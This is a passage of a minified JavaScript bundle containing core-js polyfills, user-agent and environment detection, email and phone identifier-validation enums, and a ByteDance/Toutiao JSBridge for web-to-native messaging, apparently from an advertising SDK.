          !h($, t) || e && !h(X, t) || n.push($[t]);
        }), n;
      };
    f || (j((W = function () {
      if (this instanceof W) throw TypeError("Symbol is not a constructor");
      var t = arguments.length && void 0 !== arguments[0] ? String(arguments[0]) : void 0,
        e = M(t),
        n = function (t) {
          this === X && n.call(tt, t), h(this, V) && h(this[V], e) && (this[V][e] = !1), ot(this, e, _(1, t));
        };
      return s && rt && ot(X, e, {
        configurable: !0,
        set: n
      }), r(e, t);
    })[H], "toString", function () {
      return G(this).tag;
    }), j(W, "withoutSetter", function (t) {
      return r(M(t), t);
    }), T.f = ct, P.f = at, S.f = a, I.f = w.f = l, x.f = ut, L.f = function (t) {
      return r(C(t), t);
    }, s && (q(W[H], "description", {
      configurable: !0,
      get: function () {
        return G(this).description;
      }
    }), u || j(X, "propertyIsEnumerable", ct, {
      unsafe: !0
    }))), i({
      global: !0,
      wrap: !0,
      forced: !f,
      sham: !f
    }, {
      Symbol: W
    }), U(E(N), function (t) {
      D(t);
    }), i({
      target: J,
      stat: !0,
      forced: !f
    }, {
      for: function (t) {
        var e = String(t);
        if (h(et, e)) return et[e];
        t = W(e);
        return et[e] = t, nt[t] = e, t;
      },
      keyFor: function (t) {
        if (!it(t)) throw TypeError(t + " is not a symbol");
        if (h(nt, t)) return nt[t];
      },
      useSetter: function () {
        rt = !0;
      },
      useSimple: function () {
        rt = !1;
      }
    }), i({
      target: "Object",
      stat: !0,
      forced: !f,
      sham: !s
    }, {
      create: function (t, e) {
        return void 0 === e ? O(t) : o(O(t), e);
      },
      defineProperty: at,
      defineProperties: o,
      getOwnPropertyDescriptor: a
    }), i({
      target: "Object",
      stat: !0,
      forced: !f
    }, {
      getOwnPropertyNames: l,
      getOwnPropertySymbols: ut
    }), i({
      target: "Object",
      stat: !0,
      forced: p(function () {
        x.f(1);
      })
    }, {
      getOwnPropertySymbols: function (t) {
        return x.f(b(t));
      }
    }), K && i({
      target: "JSON",
      stat: !0,
      forced: !f || p(function () {
        var t = W();
        return "[null]" != K([t]) || "{}" != K({
          a: t
        }) || "{}" != K(Object(t));
      })
    }, {
      stringify: function (t, e, n) {
        for (var r, o = [t], i = 1; i < arguments.length;) o.push(arguments[i++]);
        if ((v(r = e) || void 0 !== t) && !it(t)) return d(e) || (e = function (t, e) {
          if ("function" == typeof r && (e = r.call(this, t, e)), !it(e)) return e;
        }), o[1] = e, K.apply(null, o);
      }
    }), W[H][k] || A(W[H], k, W[H].valueOf), F(W, J), R[V] = !0;
  },
  EbDI: function (t, e) {
    t.exports = function (t) {
      if ("undefined" != typeof Symbol && null != t[Symbol.iterator] || null != t["@@iterator"]) return Array.from(t);
    }, t.exports.default = t.exports, t.exports.__esModule = !0;
  },
  Eizh: function (t, e, n) {
    var o = n("M/XQ");
    t.exports = function (t, e, n) {
      for (var r in e) o(t, r, e[r], n);
      return t;
    };
  },
  ElIT: function (t, e, n) {
    "use strict";

    var r = n("eKW+"),
      o = n("j16E"),
      n = n("g2s6");
    t.exports = r || !n(function () {
      var t = Math.random();
      __defineSetter__.call(null, t, function () {}), delete o[t];
    });
  },
  F4VR: function (t, e, n) {
    var r = n("pAXd"),
      a = n("zr9T"),
      c = n("hBnJ"),
      u = n("F9WQ");
    t.exports = r ? Object.defineProperties : function (t, e) {
      c(t);
      for (var n, r = u(e), o = r.length, i = 0; i < o;) a.f(t, n = r[i++], e[n]);
      return t;
    };
  },
  F9WQ: function (t, e, n) {
    var r = n("y2es"),
      o = n("ZTm6");
    t.exports = Object.keys || function (t) {
      return r(t, o);
    };
  },
  "FU/i": function (t, e) {
    var n = {}.toString;
    t.exports = function (t) {
      return n.call(t).slice(8, -1);
    };
  },
  FUg4: function (t, e, n) {
    var o = n("YAV1");
    t.exports = function (t, e) {
      if (!o(t)) return t;
      var n, r;
      if (e && "function" == typeof (n = t.toString) && !o(r = n.call(t))) return r;
      if ("function" == typeof (n = t.valueOf) && !o(r = n.call(t))) return r;
      if (!e && "function" == typeof (n = t.toString) && !o(r = n.call(t))) return r;
      throw TypeError("Can't convert object to primitive value");
    };
  },
  FY8A: function (t, e, n) {
    var r = n("tNbY"),
      o = n("g2s6"),
      i = n("89xZ"),
      a = n("1EXu").f,
      n = n("hYRU"),
      o = o(function () {
        a(1);
      });
    r({
      target: "Object",
      stat: !0,
      forced: !n || o,
      sham: !n
    }, {
      getOwnPropertyDescriptor: function (t, e) {
        return a(i(t), e);
      }
    });
  },
  FgOo: function (t, e, n) {
    var r,
      o,
      i,
      a,
      c,
      u,
      s,
      f,
      l = n("iKAX"),
      p = n("j16E"),
      h = n("nY95"),
      d = n("VFIL"),
      v = n("edxO"),
      y = n("twmF"),
      b = n("bQ5J"),
      n = n("iBW0"),
      g = "Object already initialized",
      p = p.WeakMap;
    s = l ? (r = y.state || (y.state = new p()), o = r.get, i = r.has, a = r.set, c = function (t, e) {
      if (i.call(r, t)) throw new TypeError(g);
      return e.facade = t, a.call(r, t, e), e;
    }, u = function (t) {
      return o.call(r, t) || {};
    }, function (t) {
      return i.call(r, t);
    }) : (n[f = b("state")] = !0, c = function (t, e) {
      if (v(t, f)) throw new TypeError(g);
      return e.facade = t, d(t, f, e), e;
    }, u = function (t) {
      return v(t, f) ? t[f] : {};
    }, function (t) {
      return v(t, f);
    }), t.exports = {
      set: c,
      get: u,
      has: s,
      enforce: function (t) {
        return s(t) ? u(t) : c(t, {});
      },
      getterFor: function (n) {
        return function (t) {
          var e;
          if (!h(t) || (e = u(t)).type !== n) throw TypeError("Incompatible receiver, " + n + " required");
          return e;
        };
      }
    };
  },
  "Fx+t": function (t, e, n) {
    var r = n("Kw61"),
      o = n("M/XQ"),
      n = n("QuJp");
    r || o(Object.prototype, "toString", n, {
      unsafe: !0
    });
  },
  GJ6r: function (t, O, E) {
    "use strict";

    !function (t) {
      E.d(O, "f", function () {
        return a;
      }), E.d(O, "b", function () {
        return c;
      }), E.d(O, "j", function () {
        return u;
      }), E.d(O, "n", function () {
        return s;
      }), E.d(O, "m", function () {
        return f;
      }), E.d(O, "o", function () {
        return l;
      }), E.d(O, "e", function () {
        return p;
      }), E.d(O, "a", function () {
        return h;
      }), E.d(O, "g", function () {
        return d;
      }), E.d(O, "i", function () {
        return v;
      }), E.d(O, "h", function () {
        return y;
      }), E.d(O, "k", function () {
        return b;
      }), E.d(O, "l", function () {
        return g;
      }), E.d(O, "c", function () {
        return m;
      }), E.d(O, "d", function () {
        return _;
      });
      function e() {
        return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
      }
      var n = E("SbFU"),
        r = E("2HLQ"),
        o = E("IOsT"),
        i = E("w0s3"),
        a = function () {
          var t = e();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        c = function () {
          var t;
          return (null === (t = null === (t = Object(n.n)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || i.b;
        },
        u = function () {
          return c() !== i.b;
        },
        s = function () {
          return c() === i.n;
        },
        f = Object(n.E)(function () {
          return /open_news/i.test(a());
        }),
        l = Object(n.E)(function () {
          return /ultralite/i.test(a());
        }),
        p = function () {
          return /windows phone/i.test(a()) ? "Windows Phone" : /android/i.test(a()) ? "android" : /iPad|iPhone|iPod/.test(a()) ? "ios" : "pc";
        },
        h = function () {
          try {
            return navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
          } catch (t) {
            return Promise.resolve({});
          }
        },
        d = function () {
          return "android" === p();
        },
        v = function () {
          return "ios" === p();
        },
        y = function () {
          return "development" === "production".trim();
        },
        b = function () {
          return window.top !== window;
        },
        g = function () {
          return s() && v();
        };
      function m() {
        var t;
        return [r.a.INVOKE_METHOD_ENABLED, r.a.INVOKE_METHOD_NOT_ENABLED, r.a.TOUTIAO_BRIDGE_NOT_ENABLED][[!(null === (t = window.ToutiaoJSBridge) || void 0 === t || !t.invokeMethod), !!window.ToutiaoJSBridge, !0].findIndex(function (t) {
          return t;
        })];
      }
      var _ = function () {
        return (void 0 !== (t = e()).DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name) ? o.a.WebWorker : self !== self.top ? o.a.Iframe : o.a.Normal;
        var t;
      };
    }.call(this, E("yLpj"));
  },
  "Gd/C": function (t, e, n) {
    function r(t) {
      return "function" == typeof t ? t : void 0;
    }
    var o = n("WgSG"),
      i = n("j16E");
    t.exports = function (t, e) {
      return arguments.length < 2 ? r(o[t]) || r(i[t]) : o[t] && o[t][e] || i[t] && i[t][e];
    };
  },
  Gft6: function (t, e, n) {
    var r = n("BMm0"),
      o = n("YAV1"),
      i = n("/R+N").onFreeze,
      a = n("q+PP"),
      n = n("TwxJ"),
      c = Object.seal;
    r({
      target: "Object",
      stat: !0,
      forced: n(function () {
        c(1);
      }),
      sham: !a
    }, {
      seal: function (t) {
        return c && o(t) ? c(i(t)) : t;
      }
    });
  },
  GgRh: function (t, e, n) {
    var r = n("j16E"),
      n = n("nY95"),
      o = r.document,
      i = n(o) && n(o.createElement);
    t.exports = function (t) {
      return i ? o.createElement(t) : {};
    };
  },
  GtW5: function (t, e, n) {
    var r = n("BMm0"),
      o = n("5m5M"),
      n = n("HE2K");
    r({
      global: !0
    }, {
      Reflect: {}
    }), n(o.Reflect, "Reflect", !0);
  },
  GvhT: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("pAXd"),
      i = n("Kshg"),
      a = n("Xy12"),
      c = n("FUg4"),
      u = n("B4Mi"),
      s = n("0XV1").f;
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __lookupGetter__: function (t) {
        var e,
          n = a(this),
          r = c(t, !0);
        do {
          if (e = s(n, r)) return e.get;
        } while (n = u(n));
      }
    });
  },
  HE2K: function (t, e, n) {
    var r = n("zr9T").f,
      o = n("oYVP"),
      i = n("PpLa")("toStringTag");
    t.exports = function (t, e, n) {
      t && !o(t = n ? t : t.prototype, i) && r(t, i, {
        configurable: !0,
        value: e
      });
    };
  },
  HF0W: function (t, e, n) {
    n("tNbY")({
      target: "Object",
      stat: !0,
      sham: !n("hYRU")
    }, {
      create: n("Yp42")
    });
  },
  Hbra: function (t, e, n) {
    var r = n("5m5M"),
      o = n("g03b");
    t.exports = function (e, n) {
      try {
        o(r, e, n);
      } catch (t) {
        r[e] = n;
      }
      return n;
    };
  },
  HyyX: function (t, e, n) {
    "use strict";

    n.d(e, "g", function () {
      return c;
    }), n.d(e, "d", function () {
      return r;
    }), n.d(e, "a", function () {
      return o;
    }), n.d(e, "f", function () {
      return i;
    }), n.d(e, "b", function () {
      return a;
    }), n.d(e, "i", function () {
      return l;
    }), n.d(e, "c", function () {
      return u;
    }), n.d(e, "e", function () {
      return s;
    }), n.d(e, "h", function () {
      return f;
    });
    var r,
      o,
      i,
      a,
      c = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (e = r = r || {}).missing = "missing", e.valid = "valid", e.invalid = "invalid", (e = o = o || {}).empty = "empty", e.whitespace = "whitespace", e.hardcode = "hardcode", e.encode = "encode", (e = i = i || {}).invalidCountry = "invalid_country", e.notANumber = "not_a_number", e.tooShort = "too_short", e.tooLong = "too_long", e.invalidLength = "invalid_length", e.emptyCountryCodeThroughIP = "empty_country_code_through_ip", e.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", e.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", e.tooShortAfterInjectPlus = "too_short_after_inject_plus", e.tooLongAfterInjectPlus = "too_long_after_inject_plus", e.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", e.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", e.notANumberAfterInjectCountry = "not_a_number_after_inject_country", e.tooShortAfterInjectCountry = "too_short_after_inject_country", e.tooLongAfterInjectCountry = "too_long_after_inject_country", e.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (e = a = a || {}).letterCase = "letter_case", e.isNotValidEmail = "is_not_valid_email", e.isNotPossibleEmail = "is_not_possible_email", e.domainTypo = "domain_typo", e.addressFormat = "address_format";
    var u,
      s,
      f,
      l = {
        raw_email: {
          label: r.missing
        },
        raw_auto_email: {
          label: r.missing
        },
        raw_phone: {
          label: r.missing
        },
        raw_auto_phone: {
          label: r.missing
        },
        hashed_email: {
          label: r.missing
        },
        hashed_phone: {
          label: r.missing
        }
      };
    (e = u = u || {}).EMPTY_VALUE = "empty_value", e.WRONG_FORMAT = "wrong_format", e.CORRECT_FORMAT = "correct_format", e.HASHED = "hashed", e.HASHED_ERR = "hashed_err", e.HASHED_CORRECT = "hashed_correct", e.PLAINTEXT_EMAIL = "plaintext_email", e.PLAINTEXT_PHONE = "plaintext_phone", (e = s = s || {}).EMPTY_VALUE = "empty_value", e.PLAIN_EMAIL = "plain_email", e.PLAIN_PHONE = "plain_phone", e.HASHED = "hashed", e.FILTER_EVENTS = "filter_events", e.UNKNOWN_INVALID = "unknown_invalid", e.BASE64_STRING_HASHED = "base64_string_hashed", e.BASE64_HEX_HASHED = "base64_hex_hashed", e.PLAIN_MDN_EMAIL = "plain_mdn_email", (e = f = f || {}).Manual = "manual", e.Auto = "auto";
  },
  IOsT: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).Normal = "1", e.Iframe = "2", e.WebWorker = "3", e.SandboxIframe = "4";
  },
  "IPO/": function (t, e, n) {
    n("BMm0")({
      target: "Object",
      stat: !0
    }, {
      setPrototypeOf: n("VGpX")
    });
  },
  Id1e: function (t, e, n) {
    "use strict";

    var r = n("0o+f"),
      o = n("zr9T"),
      i = n("PpLa"),
      a = n("pAXd"),
      c = i("species");
    t.exports = function (t) {
      var e = r(t),
        t = o.f;
      a && e && !e[c] && t(e, c, {
        configurable: !0,
        get: function () {
          return this;
        }
      });
    };
  },
  IirZ: function (t, e, n) {
    var r = n("kXxx"),
      o = n("PyIw").f,
      i = {}.toString,
      a = "object" == typeof window && window && Object.getOwnPropertyNames ? Object.getOwnPropertyNames(window) : [];
    t.exports.f = function (t) {
      return a && "[object Window]" == i.call(t) ? function (t) {
        try {
          return o(t);
        } catch (t) {
          return a.slice();
        }
      }(t) : o(r(t));
    };
  },
  Ijbi: function (t, e, n) {
    var r = n("WkPL");
    t.exports = function (t) {
      if (Array.isArray(t)) return r(t);
    }, t.exports.default = t.exports, t.exports.__esModule = !0;
  },
  Io58: function (t, e, n) {
    var r = n("FU/i"),
      n = n("5m5M");
    t.exports = "process" == r(n.process);
  },
  Ivt0: function (t, e, n) {
    "use strict";

    var r = n("tNbY"),
      o = n("hYRU"),
      i = n("ElIT"),
      a = n("Xp4F"),
      c = n("5BnI"),
      u = n("tC/m"),
      s = n("1EXu").f;
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __lookupSetter__: function (t) {
        var e,
          n = a(this),
          r = c(t, !0);
        do {
          if (e = s(n, r)) return e.set;
        } while (n = u(n));
      }
    });
  },
  JMA6: function (t, e, n) {
    var r = n("hYRU"),
      a = n("jk77"),
      c = n("uoAl"),
      u = n("pO6F");
    t.exports = r ? Object.defineProperties : function (t, e) {
      c(t);
      for (var n, r = u(e), o = r.length, i = 0; i < o;) a.f(t, n = r[i++], e[n]);
      return t;
    };
  },
  JOA9: function (t, e, n) {
    function y(t, e) {
      this.stopped = t, this.result = e;
    }
    var b = n("hBnJ"),
      g = n("ab8z"),
      m = n("Qkuu"),
      _ = n("ksQn"),
      O = n("lPlc"),
      E = n("a+yg");
    t.exports = function (t, e, n) {
      function r(t) {
        return i && E(i), new y(!0, t);
      }
      function o(t) {
        return p ? (b(t), d ? v(t[0], t[1], r) : v(t[0], t[1])) : d ? v(t, r) : v(t);
      }
      var i,
        a,
        c,
        u,
        s,
        f,
        l = n && n.that,
        p = !(!n || !n.AS_ENTRIES),
        h = !(!n || !n.IS_ITERATOR),
        d = !(!n || !n.INTERRUPTED),
        v = _(e, l, 1 + p + d);
      if (h) i = t;else {
        if ("function" != typeof (h = O(t))) throw TypeError("Target is not iterable");
        if (g(h)) {
          for (a = 0, c = m(t.length); a < c; a++) if ((u = o(t[a])) && u instanceof y) return u;
          return new y(!1);
        }
        i = h.call(t);
      }
      for (s = i.next; !(f = s.call(i)).done;) {
        try {
          u = o(f.value);
        } catch (t) {
          throw E(i), t;
        }
        if ("object" == typeof u && u && u instanceof y) return u;
      }
      return new y(!1);
    };
  },
  KKIa: function (t, e, n) {
    var r = n("tNbY"),
      n = n("freY");
    r({
      target: "Object",
      stat: !0,
      forced: Object.assign !== n
    }, {
      assign: n
    });
  },
  KRib: function (t, e) {
    var n = Math.ceil,
      r = Math.floor;
    t.exports = function (t) {
      return isNaN(t = +t) ? 0 : (0 < t ? r : n)(t);
    };
  },
  Kshg: function (t, e, n) {
    "use strict";

    var r = n("OG+r"),
      o = n("5m5M"),
      n = n("TwxJ");
    t.exports = r || !n(function () {
      var t = Math.random();
      __defineSetter__.call(null, t, function () {}), delete o[t];
    });
  },
  KvEl: function (t, e) {
    t.exports = function (t, e) {
      return {
        enumerable: !(1 & t),
        configurable: !(2 & t),
        writable: !(4 & t),
        value: e
      };
    };
  },
  Kw61: function (t, e, n) {
    var r = {};
    r[n("PpLa")("toStringTag")] = "z", t.exports = "[object z]" === String(r);
  },
  L5Il: function (t, e) {
    var n = 0,
      r = Math.random();
    t.exports = function (t) {
      return "Symbol(" + String(void 0 === t ? "" : t) + ")_" + (++n + r).toString(36);
    };
  },
  LDkE: function (t, e, n) {
    "use strict";

    n.r(e), n.d(e, "default", function () {
      return x;
    });
    var r = function (t, e) {
      return (r = Object.setPrototypeOf || {
        __proto__: []
      } instanceof Array && function (t, e) {
        t.__proto__ = e;
      } || function (t, e) {
        for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
      })(t, e);
    };
    function o(t, e) {
      function n() {
        this.constructor = t;
      }
      r(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
    }
    var i = function () {
      return (i = Object.assign || function (t) {
        for (var e, n = 1, r = arguments.length; n < r; n++) for (var o in e = arguments[n]) Object.prototype.hasOwnProperty.call(e, o) && (t[o] = e[o]);
        return t;
      }).apply(this, arguments);
    };
    (n = {})[n.Failure = 0] = "Failure", n[n.Success = 1] = "Success", n[n.Unauthorized = -1] = "Unauthorized", n[n.NotExist = -2] = "NotExist";
    a.prototype.call = function (t, e, n, r) {
      void 0 === r && (r = this.version);
      var o,
        i = this.version;
      t && "string" == typeof t && ("string" == typeof r ? i = r || this.version : "object" == typeof r && (o = r.namespace, i = r.sdkVersion || this.version), o = {
        func: t,
        params: e = "object" != typeof e ? {} : e,
        JSSDK: i,
        __msg_type: "call",
        namespace: o
      }, "function" == typeof n && (n = this.registerCallback(t, n), o.__callback_id = n), window.parent !== window && (o.__iframe_url = window.location.href), this.sendMessageToNative(o));
    }, a.prototype.on = function (t, e, n) {
      if (void 0 === n && (n = !1), t && "string" == typeof t && "function" == typeof e) {
        e = this.registerCallback(t, e);
        return this.eventMap[t] = this.eventMap[t] || {}, this.eventMap[t][e] = {
          once: n
        }, this.listenNativeEvent && (this.nativeEventListener ? this.nativeEventListener(t) : this.call("addEventListener", {
          name: t
        }, null, {
          sdkVersion: 1
        })), e;
      }
    }, a.prototype.once = function (t, e) {
      return this.on(t, e, !0);
    }, a.prototype.off = function (t, e) {
      if (!t || "string" != typeof t) return !0;
      t = this.eventMap[t];
      return t && "object" == typeof t && t.hasOwnProperty(e) && (this.deregisterCallback(e), delete t[e]), !0;
    }, a.prototype.trigger = function (t, e) {
      return this.handleMessageFromNative({
        __msg_type: "event",
        __params: e,
        __event_id: t
      });
    }, a.prototype.handleMessageFromNative = function (t) {
      var r = this,
        e = t,
        n = String(e.__callback_id);
      this.callbackProcessor && "function" == typeof this.callbackProcessor && (t = (this.callbackMap && this.callbackMap[n] || {}).method, this.callbackProcessor(e, t));
      var o = e.__params,
        i = String(e.__event_id || ""),
        e = e.__msg_type;
      this.callbackMap[n] ? e = "callback" : this.eventMap[n] && (e = "event", i = i || n);
      var a = {
        __err_code: "cb404"
      };
      switch (e) {
        case "callback":
          var c = (this.callbackMap && this.callbackMap[n] || {}).callback;
          "function" == typeof c && (a = c(o)), this.deregisterCallback(n);
          break;
        case "event":
          var u = this.eventMap[i];
          u && "object" == typeof u && Object.keys(u).forEach(function (t) {
            var e = (r.callbackMap && r.callbackMap[t] || {}).callback,
              n = u[t];
            "function" == typeof e && (a = e(o)), n && n.once && (r.deregisterCallback(t), delete u[t]);
          });
      }
      return a;
    }, a.prototype.fetchJavaScriptMessageQueue = function () {
      var t = JSON.stringify(this.javascriptMessageQueue),
        e = btoa(unescape(encodeURIComponent(t)));
      return this.setResultIFrame && 0 < this.javascriptMessageQueue.length && (this.setResultIFrame.src = "" + this.scheme + this.setResultPath + "&" + e), this.javascriptMessageQueue.splice(0, this.javascriptMessageQueue.length), t;
    }, a.prototype.sendMessageToNative = function (t) {
      var e;
      "1" !== String(t.JSSDK) && this.nativeMethodInvoker ? (e = this.nativeMethodInvoker(t)) && (e = JSON.parse(e), this.handleMessageFromNative(e)) : (this.javascriptMessageQueue.push(t), this.dispatchMessageIFrame ? this.dispatchMessageIFrame.src = "" + this.scheme + this.dispatchMessagePath : this.tryCreateIFrames());
    }, a.prototype.registerCallback = function (t, e) {
      var n = String(this.callbackId++);
      return this.callbackMap[n] = {
        method: t,
        callback: e
      }, n;
    }, a.prototype.deregisterCallback = function (t) {
      delete this.callbackMap[t];
    }, a.prototype.tryCreateIFrames = function () {
      this.dispatchMessageIFrame = this.createIFrame(this.dispatchMessageIFrameId), this.setResultIFrame = this.createIFrame(this.setResultIFrameId);
    }, a.prototype.createIFrame = function (t) {
      var e = document.getElementById(t);
      return e && "IFRAME" === e.tagName || ((e = document.createElement("iframe")).style.display = "none", e.id = t, e.title = "jsbridge_" + t, document.documentElement.appendChild(e)), e;
    }, e = a;
    function a(t) {
      this.version = t.version || "1.0.2-hotfix.0", this.nativeMethodInvoker = t.nativeMethodInvoker, this.nativeEventListener = t.nativeEventListener, this.scheme = t.scheme || "nativeapp://", this.dispatchMessagePath = t.dispatchMessagePath || "dispatch_message/", this.setResultPath = t.setResultPath || "private/setresult/SCENE_FETCHQUEUE", this.dispatchMessageIFrameId = t.dispatchMessageIFrameId || "__JSBridgeIframe__", this.setResultIFrameId = t.setResultIFrameId || "__JSBridgeIframe_SetResult__", this.listenNativeEvent = !0 === t.listenNativeEvent, this.callbackId = 1023, this.callbackMap = {}, this.eventMap = {}, this.javascriptMessageQueue = [], this.callbackProcessor = t.callbackProcessor, "undefined" != typeof window && this.tryCreateIFrames();
    }
    var c = "2.2.5-hotfix.1",
      n = "undefined" != typeof window ? window.navigator.userAgent : "",
      u = (!!n.match(/(newsarticle|videoarticle|lv|faceu|ulike|beauty_me_|faceu-os|ulike-os|beauty_me_oversea_|retouch)\/([\d.]+)/i) || /super|automobile/gi.test(n)) && !/webcast/gi.test(n) && !/luckycatversion/gi.test(n),
      s = !!n.match(/(faceu)\/([\d.]+)/i) || /gsdk/gi.test(n),
      f = !!n.match(/ttad\/0/i),
      l = !!n.match(/aweme|trill|musical_ly/i),
      p = !!n.match(/live_stream/i),
      h = !!n.match(/Webcast/i),
      d = !!n.match(/super/i),
      v = /super/gi.test(n),
      y = "undefined" != typeof window ? window : {},
      b = "undefined" != typeof window ? window : {};
    function g() {
      var t;
      if (u) return b.JSBridge && b.JSBridge.on ? t = b.JSBridge.on : b.JS2NativeBridge && b.JS2NativeBridge.on ? t = function (t) {
        b.JS2NativeBridge.on(t, JSON.stringify({
          JSSDK: c,
          __msg_type: "event",
          __callback_id: t,
          func: t
        }));
      } : b.webkit && b.webkit.messageHandlers && b.webkit.messageHandlers.onMethodParams ? t = function (t) {
        b.webkit.messageHandlers.onMethodParams.postMessage({
          JSSDK: c,
          __msg_type: "event",
          __callback_id: t,
          func: t
        });
      } : b.onMethodParams && (t = function (t) {
        return b.onMethodParams(t, {
          JSSDK: c,
          __msg_type: "event",
          __callback_id: t,
          func: t
        });
      }), t;
    }
    function m(t, e) {
      "string" == typeof e && !0 === /^(x|tc)\./.test(e) || (l || p || h) && (e = t.__params, b.JS2NativeBridge && b.JS2NativeBridge._invokeMethod && (t.__params = i({
        code: e.code
      }, e.data)));
    }
    var _,
      n = (o(O, _ = e), O.prototype.exposePublicApiToGlobal = function () {
        y.ToutiaoJSBridge = Object.assign(y.ToutiaoJSBridge || {}, this.publicApi);
      }, O);
    function O() {
      var t = _.call(this, {
        version: c,
        scheme: "bytedance://",
        listenNativeEvent: !0,
        dispatchMessageIFrameId: "__JSBridgeIframe_1.0__",
        setResultIFrameId: "__JSBridgeIframe_SetResult_1.0__",
        nativeEventListener: g(),
        callbackProcessor: m
      }) || this;
      return t.publicApi = {
        call: t.call.bind(t),
        on: t.on.bind(t),
        once: t.once.bind(t),
        off: t.off.bind(t),
        trigger: t.trigger.bind(t),
        _fetchQueue: t.fetchJavaScriptMessageQueue.bind(t),
        _handleMessageFromToutiao: t.handleMessageFromNative.bind(t)
      }, t;
    }
    var E,
      e = (o(I, E = e), I.prototype.call = function (t, e, n, r) {
        void 0 === r && (r = c), this.isLegacyCall(t) ? this.toutiaoLegacyJSB.call(t, e, n, r) : E.prototype.call.call(this, t, e, n, r);
      }, I.prototype.on = function (t, e, n, r) {
        return void 0 === n && (n = !1), (r || {}).useLegacy || this.isLegacyCall(t) ? this.toutiaoLegacyJSB.on(t, e, n) : E.prototype.on.call(this, t, e, n);
      }, I.prototype.once = function (t, e) {
        return this.isLegacyCall(t) ? this.toutiaoLegacyJSB.once(t, e) : E.prototype.once.call(this, t, e);
      }, I.prototype.off = function (t, e) {
        return this.isLegacyCall(t) ? this.toutiaoLegacyJSB.off(t, e) : E.prototype.off.call(this, t, e);
      }, I.prototype.trigger = function (t, e) {
        return this.isLegacyCall(t) ? this.toutiaoLegacyJSB.trigger(t, e) : E.prototype.trigger.call(this, t, e);
      }, I.prototype.exposePublicApiToGlobal = function () {
        var e = this;
        y.JSBridge = Object.assign(y.JSBridge || {}, this.publicApi), y.__DISABLE_JSB_PROTOCAL2__ || (y.Native2JSBridge = Object.assign(y.Native2JSBridge || {}, this.publicApi)), !v && (u || f) && this.toutiaoLegacyJSB ? this.toutiaoLegacyJSB.exposePublicApiToGlobal() : y.ToutiaoJSBridge = Object.assign(y.ToutiaoJSBridge || {}, this.publicApi), y.parent !== y && y.addEventListener && y.addEventListener("message", function (t) {
          t && t.data && t.data.__callback_id && e.handleMessageFromNative(t.data);
        }, !1), Object.defineProperties(y, {
          JSBridge: {
            writable: !1
          },
          Native2JSBridge: {
            writable: !1
          },
          ToutiaoJSBridge: {
            writable: !1
          }
        }), Object.freeze(y.JSBridge), Object.freeze(y.Native2JSBridge), Object.freeze(y.ToutiaoJSBridge);
      }, I.prototype.isLegacyCall = function (t) {
        return !(!t || "string" != typeof t || !this.toutiaoLegacyJSB) && (f || !s && !v && u && t.indexOf(".") < 0);
      }, I);
    function I(t) {
      var e,
        e = E.call(this, {
          version: c,
          nativeMethodInvoker: (b.JS2NativeBridge && b.JS2NativeBridge._invokeMethod ? e = function (t) {
            return b.JS2NativeBridge._invokeMethod(JSON.stringify(t));
          } : b.ToutiaoJSBridge && b.ToutiaoJSBridge.invokeMethod ? e = function (t) {
            return b.ToutiaoJSBridge.invokeMethod(JSON.stringify(t));
          } : b.JS2NativeBridge && b.JS2NativeBridge.call ? e = function (t) {
            return b.JS2NativeBridge.call(t.func, JSON.stringify(t));
          } : b.webkit && b.webkit.messageHandlers && b.webkit.messageHandlers.callMethodParams ? e = function (t) {
            b.webkit.messageHandlers.callMethodParams.postMessage(t);
          } : b.callMethodParams && (e = function (t) {
            return b.callMethodParams(t.func, t);
          }), e),
          nativeEventListener: g(),
          scheme: d ? "bds://" : !v && (u || b.JSBridge && b.JSBridge._invokeMethod) ? "nativeapp://" : "bytedance://",
          listenNativeEvent: u,
          callbackProcessor: m
        }) || this;
      return e.toutiaoLegacyJSB = t, e.publicApi = {
        call: e.call.bind(e),
        on: e.on.bind(e),
        once: e.once.bind(e),
        off: e.off.bind(e),
        trigger: e.trigger.bind(e),
        _fetchQueue: e.fetchJavaScriptMessageQueue.bind(e),
        _handleMessageFromApp: e.handleMessageFromNative.bind(e),
        _handleMessageFromToutiao: e.handleMessageFromNative.bind(e)
      }, e;
    }
    function w(t, e) {
      if (null == t) throw new TypeError("Cannot convert first argument to object");
      for (var n = Object(t), r = 1; r < arguments.length; r++) {
        var o = arguments[r];
        if (null != o) for (var i = Object.keys(Object(o)), a = 0, c = i.length; a < c; a++) {
          var u = i[a],
            s = Object.getOwnPropertyDescriptor(o, u);
          void 0 !== s && s.enumerable && (n[u] = o[u]);
        }
      }
      return n;
    }
    ({
      assign: w,
      polyfill: function () {
        Object.assign || Object.defineProperty(Object, "assign", {
          enumerable: !1,
          configurable: !0,
          writable: !0,
          value: w
        });
      }
    }).polyfill();
    n = new e(new n());
    try {
      n.exposePublicApiToGlobal();
    } catch (t) {}
    var x = n.publicApi;
  },
  LYf5: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      s = n("BxeX"),
      o = n("Lyt4"),
      i = n("2eF0"),
      f = n("JOA9");
    r({
      target: "Promise",
      stat: !0
    }, {
      allSettled: function (t) {
        var c = this,
          e = o.f(c),
          u = e.resolve,
          n = e.reject,
          r = i(function () {
            var r = s(c.resolve),
              o = [],
              i = 0,
              a = 1;
            f(t, function (t) {
              var e = i++,
                n = !1;
              o.push(void 0), a++, r.call(c, t).then(function (t) {
                n || (n = !0, o[e] = {
                  status: "fulfilled",
